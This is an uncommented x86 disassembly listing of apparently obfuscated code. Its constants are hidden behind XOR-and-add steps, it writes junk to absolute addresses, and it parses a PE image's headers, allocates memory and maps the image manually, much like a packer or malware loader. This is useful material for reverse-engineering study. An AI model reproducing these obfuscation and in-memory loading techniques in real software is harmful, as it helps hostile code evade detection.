  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
